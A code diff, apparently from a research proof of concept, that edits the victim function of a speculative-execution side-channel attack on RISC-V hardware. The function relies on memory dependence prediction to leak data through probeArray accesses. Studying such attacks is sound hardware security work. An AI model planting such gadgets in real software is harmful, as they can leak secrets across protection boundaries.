@@ -109,14 +109,15 @@ uint32_t tempString[ARRAY_SIZE_FACTOR];
  * @input idx input to be used to idx the array
  */
 //void victimFunc(uint32_t targetAddr, uint32_t idx){
-void victimFunc(uint32_t targetAddr){
+//void victimFunc(uint32_t targetAddr){
+void victimFunc(uint32_t targetIdx){
 
 	// "Slowly" store a value at a memory location (here *memoryDestination).
 //	char **memoryDestination = *delayer;
 	// "Quickly" load that value from that memory location.
 //	*memoryDestination = knownString;
 //	tempStringIndex = idx; 
-	tempString[1] = targetAddr;//tempString[idx]=
+	tempString[1] = targetIdx;//tempString[idx]=
 	tempStringIndex = tempStringIndex << 4;
 	asm("fcvt.s.wu	fa4, %[in]\n"
 		"fcvt.s.wu	fa5, %[inout]\n"
@@ -137,6 +138,7 @@ void victimFunc(uint32_t targetAddr){
 	// Will only succeed on machines with MDP (Memory Dependence Prediction) mechanism.
 //	anchorVar &= probeArray[(*guideArray)[idx] * ARRAY_STRIDE];
 	anchorVar &= probeArray[guideArray[tempString[1]] * ARRAY_STRIDE];//tempString[idx]
+
 }
 
 // TBD: mix the order in other ways.
